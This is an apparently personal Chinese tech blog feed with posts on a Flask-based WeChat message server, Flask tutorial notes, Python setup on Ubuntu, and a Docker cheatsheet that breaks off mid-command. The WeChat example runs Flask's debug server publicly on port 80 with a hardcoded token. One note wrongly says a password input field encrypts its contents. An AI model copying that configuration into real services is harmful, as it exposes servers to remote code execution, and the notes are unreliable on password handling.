class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, escape, url_for, request, make_response</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> xmltodict</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/weixin/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wechat</span><span class="params">()</span>:</span></span><br><span class="line">    </span><br><span class="line">    args = request.args</span><br><span class="line">    signature = args.get(<span class="string">'signature'</span>)</span><br><span class="line">    timestamp = args.get(<span class="string">'timestamp'</span>)</span><br><span class="line">    nonce = args.get(<span class="string">'nonce'</span>)</span><br><span class="line">    echostr = args.get(<span class="string">'echostr'</span>)</span><br><span class="line">    token = <span class="string">'2019cj'</span> <span class="comment"># 你的token，可自行设置</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 字典排序</span></span><br><span class="line">    temp = [token, timestamp, nonce]</span><br><span class="line">    temp.sort()</span><br><span class="line">    <span class="comment"># 字符串拼接并进行sha1加密</span></span><br><span class="line">    temp = <span class="string">""</span>.join(temp)</span><br><span class="line">    sig = hashlib.sha1(temp.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 开发者获得加密后的字符串可与signature对比，标识该请求来源于微信</span></span><br><span class="line">    <span class="keyword">if</span> sig == signature:</span><br><span class="line">        <span class="comment"># 根据请求方式.返回不同的内容 </span></span><br><span class="line">        <span class="comment"># 如果是get方式,代表是验证服务器有效性</span></span><br><span class="line">        <span class="keyword">if</span> request.method == <span class="string">"GET"</span>:</span><br><span class="line">            <span class="keyword">return</span> echostr</span><br><span class="line">         <span class="comment"># 如果POST方式,代表是微服务器转发给我们的消息</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            resp_data = request.data</span><br><span class="line">            resp_dict = xmltodict.parse(resp_data).get(<span class="string">'xml'</span>)</span><br><span class="line">            ToUserName = resp_dict.get(<span class="string">'ToUserName'</span>)</span><br><span class="line">            FromUserName =resp_dict.get(<span class="string">'FromUserName'</span>)</span><br><span class="line">            MsgType = resp_dict.get(<span class="string">'MsgType'</span>)</span><br><span class="line">            CreateTime = int(time.time())</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> MsgType == <span class="string">'text'</span>:</span><br><span class="line">                content = resp_dict.get(<span class="string">'Content'</span>)</span><br><span class="line">            <span class="keyword">elif</span> resp_dict.get(<span class="string">'MsgType'</span>)==<span class="string">'image'</span>:</span><br><span class="line">                content = resp_dict.get(<span class="string">'PicUrl'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                content = <span class="string">''</span></span><br><span class="line">            response = &#123;</span><br><span class="line">                    <span class="string">"ToUserName"</span>: FromUserName,</span><br><span class="line">                    <span class="string">"FromUserName"</span>: ToUserName,</span><br><span class="line">                    <span class="string">"CreateTime"</span>: CreateTime,</span><br><span class="line">                    <span class="string">"MsgType"</span>: <span class="string">"text"</span>,</span><br><span class="line">                    <span class="string">"Content"</span>: content,</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">if</span> response:</span><br><span class="line">                response = &#123;<span class="string">"xml"</span>: response&#125;</span><br><span class="line">                response = xmltodict.unparse(response)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                response = <span class="string">''</span></span><br><span class="line">            <span class="keyword">return</span> make_response(response)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'errno'</span>, <span class="number">403</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span><span class="params">(e)</span>:</span></span><br><span class="line">    <span class="comment"># note that we set the 404 status explicitly</span></span><br><span class="line">    <span class="keyword">return</span>(<span class="string">'404 Error'</span>) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span>(<span class="string">'Hello!&lt;br&gt;A world as simple as possible.'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>,debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><ul><li>打开服务器的shell，路径移动到wechat.py所在的最小子文件夹，输入’python wechat.py’</li><li>登录 <a href="https://mp.weixin.qq.com/" target="_blank" rel="noopener">https://mp.weixin.qq.com/</a> 。点击左下角开发选项下的<code>基本配置</code> 。</li><li>点击下图中的<code>查看</code>，将服务器IP加入其中 。<br><img src="http://mmbiz.qpic.cn/mmbiz_jpg/RpaIDoV1UhZUlJHSk0thxgM2tLenia3M4QrotumGhTuvibFHfRoakGicEheXAia4r7AEcDH2rNXrBG1ib5YsfdZ0nMA/0" alt=""></li><li>点服务器配置的<code>修改配置</code>，提交成功后点<code>启用</code>最终页面效果如下：<br><img src="http://mmbiz.qpic.cn/mmbiz_jpg/RpaIDoV1UhZUlJHSk0thxgM2tLenia3M4uZDVKHm8icSchDwyguL5kT1mQ6fzpDxhGSzdQnwiaTXzI2ot9NnpZndQ/0" alt=""></li></ul><h2 id="消息解析"><a href="#消息解析" class="headerlink" title="消息解析"></a>消息解析</h2><p><a href="https://developers.weixin.qq.com/doc/offiaccount/Message_Management/Receiving_standard_messages.html" target="_blank" rel="noopener">https://developers.weixin.qq.com/doc/offiaccount/Message_Management/Receiving_standard_messages.html</a></p><p>不同类型的消息结构对比：</p><table><thead><tr><th>参数</th><th>文本</th><th>图片</th><th>语音</th><th>视频</th><th>短视频</th></tr></thead><tbody><tr><td>ToUserName</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>FromUserName</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>CreateTime</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>MsgType</td><td>text</td><td>image</td><td>voice</td><td>video</td><td>shortvideo</td></tr><tr><td>Content</td><td>√</td><td>×</td><td>×</td><td>×</td><td>×</td></tr><tr><td>MsgId</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>PicUrl</td><td>×</td><td>√</td><td>×</td><td>×</td><td>×</td></tr><tr><td>MediaId</td><td>×</td><td>√</td><td>√</td><td>√</td><td>√</td></tr><tr><td>Format</td><td>×</td><td>×</td><td>√</td><td>×</td><td>×</td></tr><tr><td>Recognition</td><td>×</td><td>×</td><td>√</td><td>×</td><td>×</td></tr><tr><td>ThumbMediaId</td><td>×</td><td>×</td><td>×</td><td>√</td><td>√</td></tr></tbody></table><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a href="https://www.jianshu.com/p/29c692811322" target="_blank" rel="noopener">https://www.jianshu.com/p/29c692811322</a></li><li><a href="https://www.cnblogs.com/crazymagic/p/9741459.html" target="_blank" rel="noopener">https://www.cnblogs.com/crazymagic/p/9741459.html</a></li><li><a href="https://zhuanlan.zhihu.com/p/50801694" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/50801694</a><h2 id="错误及修正"><a href="#错误及修正" class="headerlink" title="错误及修正"></a>错误及修正</h2>Unicode-objects must be encoded before hashing⇒hashlib.sha1(temp.encode(‘utf-8’)).hexdigest()</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Flask </tag>
            
            <tag> 微信 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask</title>
      <link href="/cs/flask/"/>
      <url>/cs/flask/</url>
      
        <content type="html"><![CDATA[<p>按官方样例对flask语句进行详解。<code>参考</code>是用于查询官方文档。<code>备忘录</code>存储命令清单，后续还需添加。<code>文件结构</code>有助于速览。<code>文件依赖</code>给出各个文件的引用关系。<code>flaskr文件逐个详解</code>，对项目内的每条独立命令进行解析。<br><a id="more"></a></p><h1 id="1-参考"><a href="#1-参考" class="headerlink" title="1. 参考"></a>1. 参考</h1><p><a href="https://flask.palletsprojects.com/en/1.1.x/quickstart/#a-minimal-application" target="_blank" rel="noopener">https://flask.palletsprojects.com/en/1.1.x/quickstart/#a-minimal-application</a><br><a href="https://flask.palletsprojects.com/en/1.1.x/quickstart/#variable-rules" target="_blank" rel="noopener">https://flask.palletsprojects.com/en/1.1.x/quickstart/#variable-rules</a><br><a href="https://dormousehole.readthedocs.io/en/latest/tutorial/factory.html" target="_blank" rel="noopener">https://dormousehole.readthedocs.io/en/latest/tutorial/factory.html</a><br><a href="https://dormousehole.readthedocs.io/en/latest/tutorial/database.html" target="_blank" rel="noopener">https://dormousehole.readthedocs.io/en/latest/tutorial/database.html</a></p><h1 id="2-备忘录"><a href="#2-备忘录" class="headerlink" title="2. 备忘录"></a>2. 备忘录</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello, World!'</span></span><br><span class="line"><span class="meta">@app.route('/projects/')</span></span><br><span class="line"><span class="meta">@app.route('/login', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="meta">@app.route('/user/&lt;username&gt;')</span></span><br><span class="line"><span class="meta">@app.route('/post/&lt;int:post_id&gt;')</span></span><br><span class="line"><span class="meta">@app.route('/path/&lt;path:subpath&gt;')</span></span><br></pre></td></tr></table></figure><h1 id="3-文件结构概览"><a href="#3-文件结构概览" class="headerlink" title="3. 文件结构概览"></a>3. 文件结构概览</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">flaskr</span><br><span class="line">    static</span><br><span class="line">        style.css</span><br><span class="line">        table.js</span><br><span class="line">    templates</span><br><span class="line">        base.html</span><br><span class="line">        auth</span><br><span class="line">            login.html</span><br><span class="line">            register.html</span><br><span class="line">        blog</span><br><span class="line">            blog.html</span><br><span class="line">            blogCreate.html</span><br><span class="line">            blogUpdate.html</span><br><span class="line">    schema.sql</span><br><span class="line">    __init__.py</span><br><span class="line">    auth.py</span><br><span class="line">    blog.py</span><br><span class="line">    db.py</span><br></pre></td></tr></table></figure><h1 id="4-文件关系依赖"><a href="#4-文件关系依赖" class="headerlink" title="4. 文件关系依赖"></a>4. 文件关系依赖</h1><p><code>A⇒B</code>：表示B要调用A文件里的内容。<br>schema.sql⇒db.py⇒auth.py</p><h1 id="5-flaskr文件逐个解析"><a href="#5-flaskr文件逐个解析" class="headerlink" title="5. flaskr文件逐个解析"></a>5. flaskr文件逐个解析</h1><h2 id="5-1-templates文件夹"><a href="#5-1-templates文件夹" class="headerlink" title="5.1. templates文件夹"></a>5.1. templates文件夹</h2><h3 id="5-1-1-base-html文件"><a href="#5-1-1-base-html文件" class="headerlink" title="5.1.1. base.html文件"></a>5.1.1. base.html文件</h3><p><code>&lt;title&gt;{% block title %}{% endblock %}&lt;/title&gt;</code> </p><blockquote><ul><li>其他文档里，用<code>{% block title %}{% endblock %}</code>括起来的内容都会转化为title。</li><li><code>&lt;title&gt;&lt;/title&gt;</code>：决定其内容是title。 </li><li><code>{% block title %}{% endblock %}</code>：起占位作用。title可以是任意的html标签。</li><li>如果static文件以外的文件里的html元素不用block包裹，则可能无法生效。</li></ul></blockquote><p><code>&lt;link rel=&quot;stylesheet&quot; href=&quot;{{ url_for('static', filename='style.css') }}&quot;&gt;</code></p><blockquote><ul><li>static是flaskr的一级子文件夹。</li><li>style.css是static里的文件。</li></ul></blockquote><p><code>&lt;script type=text/javascript src=&quot;{{ url_for('static', filename='table.js') }}&quot;&gt;&lt;/script&gt;</code></p><blockquote><ul><li>全局script。</li></ul></blockquote><p><code>&lt;nav&gt;&lt;/nav&gt;</code></p><blockquote><ul><li>导航栏。</li></ul></blockquote><p><code>&lt;a href=&quot;{{ url_for('blog.shixi')}}&quot;&gt;图集&lt;/a&gt;</code></p><blockquote><ul><li>blog是flaskr里的py文件。</li><li>shixi是blog.py的一个路径装饰器下的函数。</li></ul></blockquote><p><code>{{ g.user['username'] }}</code></p><blockquote><ul><li>用户名，网页刷新时自动传入。</li></ul></blockquote><p><code>{% if g.user %}{% else %}{% endif %}</code></p><blockquote><ul><li>条件表达式。<strong>是谁的呢</strong>？</li></ul></blockquote><p><code>{% if g.user %}</code></p><blockquote><ul><li>如果已登录。</li></ul></blockquote><p><code>&lt;ul&gt;&lt;/ul&gt;</code></p><blockquote><ul><li><strong>通过css来控制对齐吗？</strong></li></ul></blockquote><p><code>&lt;section class=&quot;content&quot;&gt;&lt;/section&gt;</code></p><blockquote><ul><li>子html的格式定义。</li></ul></blockquote><p><code>{% for message in get_flashed_messages() %}</code></p><blockquote><ul><li><strong>全项目只用到了flask.flash(error)。用于程序出错时，在页面显示错误。error可自定义。</strong></li></ul></blockquote><p><code>{{ message }}</code></p><blockquote><ul><li><strong>flash错误信息。</strong></li></ul></blockquote><h3 id="blog"><a href="#blog" class="headerlink" title="blog"></a>blog</h3><h4 id="blog-html"><a href="#blog-html" class="headerlink" title="blog.html"></a>blog.html</h4><p><code>{% extends 'base.html' %}</code></p><blockquote><ul><li>继承自base.html。</li></ul></blockquote><p><code>&lt;a class=&quot;action&quot; href="{{ url_for('blog.create') }}&quot;&gt;New&lt;/a&gt;</code></p><blockquote><ul><li>不传数据，只调用函数。</li></ul></blockquote><p><code>&lt;a class=&quot;action&quot; href="{{ url_for('blog.update', id=post['id']) }}&quot;&gt;编辑&lt;/a&gt;</code></p><blockquote><ul><li>传数据，且调用函数。<code>id=post[&#39;id&#39;])</code>用来传参。</li></ul></blockquote><p><code>{% for post in posts %}</code></p><blockquote><ul><li>自动传post。post的内容在blog.py里面定义。</li></ul></blockquote><p><code>{% if g.user['id'] == post['author_id'] %}</code></p><blockquote><ul><li>只显示当前登录用户的数据。</li></ul></blockquote><p><code>post[&#39;created&#39;].</code></p><blockquote><ul><li>获取post的键created的值。</li></ul></blockquote><p><code>{}</code></p><blockquote><ul><li>html内的逻辑语句或占位符。</li></ul></blockquote><p><code>{{}}</code></p><blockquote><ul><li>抽取html的元素或属性，括起来用于传递参数。传参用flask的方法，如url_for()、request.form[]。</li></ul></blockquote><h4 id="blogCreate-html"><a href="#blogCreate-html" class="headerlink" title="blogCreate.html"></a>blogCreate.html</h4><p><code>&lt;form method=&quot;post&quot;&gt;&lt;/form&gt;</code></p><blockquote><ul><li>里面的内容可以传参了。</li></ul></blockquote><p><code>&lt;input name=&quot;title&quot; id=&quot;title&quot; value="{{ request.form['title'] }}&quot; required&gt;</code><br><code>&lt;textarea name=&quot;body&quot; id=&quot;body&quot;&gt;{{ request.form['body'] }}&lt;/textarea&gt;</code><br><code>&lt;input type=&quot;submit&quot; value=&quot;Save&quot;&gt;</code></p><h4 id="blogUpdate-html"><a href="#blogUpdate-html" class="headerlink" title="blogUpdate.html"></a>blogUpdate.html</h4><p><code>&lt;input name=&quot;title&quot; id=&quot;title&quot; value="{{ request.form['title'] or post['title'] }}&quot;</code><br><code>&lt;textarea name=&quot;body&quot; id=&quot;body&quot;&gt;{{ request.form['body'] or post['body'] }}&lt;/textarea&gt;</code></p><blockquote><ul><li>已有数据时自动填充或没有数据。</li></ul></blockquote><p><code>&lt;form action="{{ url_for('blog.delete', id=post['id']) }}&quot; method=&quot;post&quot;&gt;</code></p><blockquote><ul><li>调用blog里的python函数，并传递参数。</li></ul></blockquote><h3 id="auth"><a href="#auth" class="headerlink" title="auth"></a>auth</h3><h4 id="login-html"><a href="#login-html" class="headerlink" title="login.html"></a>login.html</h4><p><code>&lt;input type=&quot;password&quot; name=&quot;password&quot; id=&quot;password&quot; required&gt;</code></p><blockquote><ul><li>type=”password” 会自动加密。加密函数在anth.py中定义。</li></ul></blockquote><h4 id="register-html"><a href="#register-html" class="headerlink" title="register.html"></a>register.html</h4><p>除了标题和submit按钮的值外，其余的和login.html一模一样。</p><h2 id="schema-sql"><a href="#schema-sql" class="headerlink" title="schema.sql"></a>schema.sql</h2><p>存放sql语句。用来初始化数据库。</p><h2 id="db-py"><a href="#db-py" class="headerlink" title="db.py"></a>db.py</h2><p>太漂亮了，每个函数就几行。<br>lib依赖：</p><blockquote><p>click<br>sqlite3<br>flask：current_app、g、.cli.with_appcontext</p></blockquote><p>用到的命令：<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">g.db</span><br><span class="line">g.db.row_factory</span><br><span class="line">g.db.executescript(f.read().decode(<span class="string">"utf8"</span>))</span><br><span class="line">g.pop(<span class="string">"db"</span>, <span class="keyword">None</span>)</span><br><span class="line">current_app.config[<span class="string">"DATABASE"</span>]</span><br><span class="line"><span class="keyword">with</span> current_app.open_resource(<span class="string">"schema.sql"</span>) <span class="keyword">as</span> f</span><br><span class="line">sqlite3.Row</span><br><span class="line"><span class="meta">@click.command("init-db")</span></span><br><span class="line">click.echo(<span class="string">"Initialized the database."</span>)</span><br><span class="line">app.teardown_appcontext(close_db)</span><br><span class="line">app.cli.add_command(init_db_command)</span><br><span class="line">get_db()：用于连接数据库</span><br></pre></td></tr></table></figure></p><h2 id="auth-py"><a href="#auth-py" class="headerlink" title="auth.py"></a>auth.py</h2><p>lib依赖：</p><blockquote><ul><li>functools</li><li>flask：Blueprint、flash、g、redirect、render_template、request、session、url_for</li><li>werkzeug.security：<ul><li>检查密码是否一致：check_password_hash</li><li>加密密码：generate_password_hash</li></ul></li><li>flaskr.db ：get_db（用于链接数据库）</li></ul></blockquote><p>用到的命令:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp = Blueprint(<span class="string">"auth"</span>, __name__, url_prefix=<span class="string">"/auth"</span>)</span><br></pre></td></tr></table></figure></p><blockquote><ul><li>auth：蓝图名。</li><li><code>__name__</code>。</li><li>url_prefix：bp.route的前缀路径。</li></ul></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@functools.wraps(view)</span></span><br></pre></td></tr></table></figure><blockquote><ul><li>复制属性。<ul><li>《Python 3标准库》，苏金国，201903，P118.</li><li><em>The Python 3 Standard Library by Example.pdf</em>,DougHellmann,2017,P149.</li></ul></li></ul></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wrapped_view(**kwargs)</span><br></pre></td></tr></table></figure><blockquote><ul><li>如果没登录，就重定向到登录页。</li><li>否则返回view的参数。</li></ul></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@bp.before_app_request</span></span><br></pre></td></tr></table></figure><blockquote><ul><li>请求前的装饰器。</li></ul></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.get(<span class="string">"user_id"</span>)</span><br></pre></td></tr></table></figure><blockquote><ul><li>获取用ID。<ul><li>如果是None，则把None赋值给g.user。</li><li>否则从用户user表中取出id与session.get(“user_id”)相同的那条记录。</li></ul></li></ul></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get_db().execute(<span class="string">"SELECT * FROM user WHERE id = ?"</span>, (user_id,)).fetchone()</span><br></pre></td></tr></table></figure><blockquote><ul><li>连接数据库并查询，取一项。</li></ul></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">db = get_db()</span><br><span class="line">db.excute(sql).fetchone()</span><br><span class="line">db.commit()</span><br><span class="line"><span class="keyword">if</span> request.method == <span class="string">"POST"</span>:</span><br><span class="line">    username = request.form[<span class="string">"username"</span>]</span><br></pre></td></tr></table></figure><blockquote><ul><li>解析POST过来的函数。</li></ul></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flash(error)</span><br></pre></td></tr></table></figure><blockquote><ul><li>检查错误。</li></ul></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> redirect(url_for(<span class="string">"auth.login"</span>))</span><br></pre></td></tr></table></figure><blockquote><ul><li>重定向到auth.py的login函数。form表单数据提交后执行的函数。</li></ul></blockquote><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> render_template(<span class="string">"auth/register.html"</span>)</span><br></pre></td></tr></table></figure><blockquote><ul><li>含form表单的当前路径显示的网页。</li></ul></blockquote><p><a href="https://realpython.com/search?q=flask-by-example" target="_blank" rel="noopener">https://realpython.com/search?q=flask-by-example</a></p><h1 id="6-事前准备"><a href="#6-事前准备" class="headerlink" title="6. 事前准备"></a>6. 事前准备</h1><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pallets/flask</span><br><span class="line">cd C:\Users\cj\Documents\GitHub\flask\examples\tutorial\flaskr</span><br><span class="line">py <span class="number">-3</span> -m venv venv</span><br><span class="line">venv/Scripts/activate</span><br><span class="line">flask init-db <span class="comment"># 生成数据库文件</span></span><br><span class="line">set FLASK_APP=flaskr</span><br><span class="line">set FLASK_ENV=development</span><br><span class="line">flask run</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20191104:Database System Concepts,Python3 in Ubuntu,MobaXterm debut</title>
      <link href="/cs/20191104/"/>
      <url>/cs/20191104/</url>
      
        <content type="html"><![CDATA[<p>1.Contents and Chapter1<br>2.apt-get,python3,python3-pip,venv<br>3.Download and start up<br><a id="more"></a></p><h2 id="Python3-in-Ubuntu"><a href="#Python3-in-Ubuntu" class="headerlink" title="Python3 in Ubuntu"></a>Python3 in Ubuntu</h2><p>apt list –installed | grep python<br>sudo apt-get update<br>sudo apt-get upgrade python3<br>sudo apt install python3-pip<br>sudo apt-get install build-essential libssl-dev libffi-dev python-dev<br>pip3 -V<br>sudo apt install -y python3-venv<br>mkdir wx<br>cd wx<br>python3 -m venv wx<br>ls wx<br>source wx/bin/activate<br>vim hello.py<br>i(Escape)<br>zz<br>:wq</p><p>pip3 install flask<br>python3 hello.py</p><p><a href="https://stackoverflow.com/questions/38298652/permissionerror-errno-13-permission-denied-flask-run" target="_blank" rel="noopener">https://stackoverflow.com/questions/38298652/permissionerror-errno-13-permission-denied-flask-run</a>  change port to 5000(tencent denies port 80)<br><a href="https://vitux.com/install-python3-on-ubuntu-and-set-up-a-virtual-programming-environment/" target="_blank" rel="noopener">https://vitux.com/install-python3-on-ubuntu-and-set-up-a-virtual-programming-environment/</a></p><h2 id="MobaXterm-debut"><a href="#MobaXterm-debut" class="headerlink" title="MobaXterm debut"></a>MobaXterm debut</h2><ol><li>Download<br><a href="https://mobaxterm.mobatek.net/download-home-edition.html" target="_blank" rel="noopener">https://mobaxterm.mobatek.net/download-home-edition.html</a> →Installer（Less CPU）<br>Chrome is too slow for some unknown reason,change to Edge</li><li>Connect Ubuntu<br>Session → SSH →【hostname】 【username】→ passport →OK</li><li>Connect  Windows<br>Session → RDP →【hostname】 【username】→ passport → OK<br><a href="https://blog.mrzhenggang.com/supercomputer-courses-ssh-sftp-mobaxterm/" target="_blank" rel="noopener">https://blog.mrzhenggang.com/supercomputer-courses-ssh-sftp-mobaxterm/</a><br><a href="https://mobaxterm.mobatek.net/documentation.html" target="_blank" rel="noopener">https://mobaxterm.mobatek.net/documentation.html</a></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Docker</title>
      <link href="/cs/docker/"/>
      <url>/cs/docker/</url>
      
        <content type="html"><![CDATA[<p>镜像的构建、容器的运行监控、网络的管理、仓库的应用、集群的部署。<br>容器技术与Docker概念@<br>容器技术概念@<br>容器技术的发展历史（历程、前世今生）@<br>容器技术的原理@<br>Docker与其他容器技术的区别@<br>Docker与虚拟机的异同，客观评价两者的优缺点@<br>启动简单的容器@<br>容器与容器云对软件行业的影响@<br>Registry@Registry是Docker公司为了更方便镜像流通而设计的一种镜像仓库。像手机上的应用商店一样，用户可以在上面发布镜像和拉取镜像，官方的Docker Hub还提供更高级的企业服务。<br>hierarchy@Stack：define the interactions of all the services<br>Services:define how containers behave in production<br>Container (you are here)<br>数据卷@数据卷是挂载到容器的一个目录，它与容器的生命周期独立，不会因为容器的销毁而消失。<br><a id="more"></a></p><h1 id="cheatsheet"><a href="#cheatsheet" class="headerlink" title="cheatsheet"></a>cheatsheet</h1><p>命令分类：管理、镜像、容器、仓库、网络、数据卷、编排。<br>分类在每次版本发布时都有调整。<br><a href="https://docs.docker.com/engine/reference/commandline/docker/" target="_blank" rel="noopener">https://docs.docker.com/engine/reference/commandline/docker/</a><br><a href="https://docs.docker.com/engine/reference/commandline/build/" target="_blank" rel="noopener">https://docs.docker.com/engine/reference/commandline/build/</a><br><code>docker、-v、info、--help、image/container ls (--all/-aq)、run hello-world、logs \&lt;names&gt;</code></p><h2 id="List-Docker-CLI-commands"><a href="#List-Docker-CLI-commands" class="headerlink" title="List Docker CLI commands"></a>List Docker CLI commands</h2><p>docker<br>docker container –help  </p><h2 id="Display-Docker-version-and-info"><a href="#Display-Docker-version-and-info" class="headerlink" title="Display Docker version and info"></a>Display Docker version and info</h2><p>docker –version<br>docker version<br>docker info  Docker的各项运行状态信息（容器数量、状态，镜像数量，服务版本，存储驱动、根目录，数据卷，插件，网络，安全，硬件等信息）。<br>$ docker inspect 检查容器或者镜像详细信息。输出的内容却相当丰富。</p><h2 id="Execute-Docker-image"><a href="#Execute-Docker-image" class="headerlink" title="Execute Docker image"></a>Execute Docker image</h2><p>docker run hello-world  </p><h2 id="List-Docker-images"><a href="#List-Docker-images" class="headerlink" title="List Docker images"></a>List Docker images</h2><p>docker image ls  </p><h2 id="List-Docker-containers-running-all-all-in-quiet-mode"><a href="#List-Docker-containers-running-all-all-in-quiet-mode" class="headerlink" title="List Docker containers (running, all, all in quiet mode)"></a>List Docker containers (running, all, all in quiet mode)</h2><p>docker container ls<br>docker container ls –all<br>docker container ls -aq  </p><p>注意冒号和双斜线<br><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd c:</span><br><span class="line">cd cd C:\\docker\\demo</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure></p><p><a href="https://user-images.githubusercontent.com/32757669/55721943-4d69ef00-5a37-11e9-9e58-903acf750d44.png" target="_blank" rel="noopener">https://user-images.githubusercontent.com/32757669/55721943-4d69ef00-5a37-11e9-9e58-903acf750d44.png</a><br><img src="https://user-images.githubusercontent.com/32757669/55720183-cf0b4e00-5a32-11e9-9b41-33c365290b09.png" alt="image"></p><p><code>docker kill 